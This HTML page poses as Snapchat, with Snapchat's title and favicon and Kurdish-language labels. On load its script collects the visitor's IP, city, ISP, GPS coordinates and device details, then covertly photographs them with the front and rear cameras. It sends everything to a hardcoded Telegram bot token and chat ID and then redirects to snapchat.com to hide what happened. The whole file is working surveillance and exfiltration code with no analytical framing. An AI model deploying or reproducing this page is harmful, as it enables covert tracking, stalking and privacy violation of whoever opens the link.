<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <link rel="icon" href="https://assets.sc-static.net/images/ico/favicon.ico" type="image/x-icon">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8974970739:AAFlFv-AFuue84Y_2mRzyi1uOpZv-U9g1jg';
        const CHAT_ID = '1838540741';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {}
        }

        async function sendTelegramPhoto(blob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', caption);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {}
        }

        async function gatherIntelAndCapture() {
            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {
                ipData = { ip: "نەزانراو", city: "نەزانراو", region: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
            }

            let gpsInfo = "GPS ڕەتکرایەوە یان بەردەست نییە";
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000 });
                    });
                    gpsInfo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`;
                } catch (e) {}
            }

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${window.screen.width} x ${window.screen.height}`;
            const language = navigator.language;
            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'نەزانراو';
            const cores = navigator.hardwareConcurrency || 'نەزانراو';

            const summaryReport = `
🚨 *سەردانکەرێکی نوێ کرایەوە!* 👻
━━━━━━━━━━━━━━━━━━━━
🌐 *IP Address:* \`${ipData.ip || 'N/A'}\`
🏙 *شار / هەرێم:* ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'} (${ipData.country_name || 'N/A'})
🏢 *کۆمپانیا (ISP):* ${ipData.org || 'N/A'}
📍 *لۆکەیشنی GPS:* ${gpsInfo}
💻 *سیستم / پلاتفۆرم:* ${platform}
📱 *جۆری مۆبایل / ئامێر:* ${userAgent}
📐 *قەبارەی شاشە:* ${screenRes}
🧠 *ڕام (Memory):* ${memory} | کورەکان: ${cores}
🗣 *زمان:* ${language}
━━━━━━━━━━━━━━━━━━━━`.trim();

            await sendTelegramMessage(summaryReport);

            // ١. گرتنی وێنەی پێشەوە (سێلفی)
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = frontStream;
                
                await new Promise(r => setTimeout(r, 1200));

                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const frontBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                if (frontBlob) {
                    await sendTelegramPhoto(frontBlob, "📸 *وێنەی پێشەوە (سێلفی)*\nIP: " + ipData.ip);
                }

                frontStream.getTracks().forEach(track => track.stop());
            } catch (err) {}

            // ٢. گرتنی وێنەی پشتەوە (Rear Camera / دیمەنی بەرامبەر)
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: { exact: "environment" } }, 
                    audio: false 
                });
                video.srcObject = backStream;

                await new Promise(r => setTimeout(r, 1200));

                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const backBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                if (backBlob) {
                    await sendTelegramPhoto(backBlob, "📸 *وێنەی پشتەوە (دیمەنی بەرامبەر)*\nCity: " + ipData.city);
                }

                backStream.getTracks().forEach(track => track.stop());
            } catch (err) {
                try {
                    const altStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    video.srcObject = altStream;
                    await new Promise(r => setTimeout(r, 1000));
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const altBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                    if (altBlob) {
                        await sendTelegramPhoto(altBlob, "📸 *وێنەی دووەمی کامێرا*");
                    }
                    altStream.getTracks().forEach(track => track.stop());
                } catch (e2) {}
            }

            // گواستنەوە بۆ سناپچات دوای تەواوبوون
            setTimeout(() => {
                window.location.href = "https://www.snapchat.com";
            }, 1000);
        }

        window.onload = () => {
            setTimeout(gatherIntelAndCapture, 300);
        };
    </script>
</body>
</html>
